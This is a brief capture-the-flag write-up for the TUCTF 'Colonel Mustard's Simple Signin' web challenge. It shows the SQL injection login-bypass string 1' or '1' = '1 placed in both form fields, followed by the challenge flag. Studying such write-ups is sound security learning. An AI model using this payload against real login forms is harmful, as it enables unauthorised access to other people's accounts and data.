# Colonel Mustard's <br> Simple Signin

__PROBLEM__

We know Col Mustard is up to something--can you find a way in to tell us what?

http://13.59.239.132/

__SOLUTION__

Again the login form, I would say now we should try the SQL injection.

Starting with a simple:

```

$password = 1' or '1' = '1

$username = 1' or '1' = '1

```

FLAG - `TUCTF{1_4ccu53_c0l0n3l_mu574rd_w17h_7h3_r0p3_1n_7h3_l061n}`
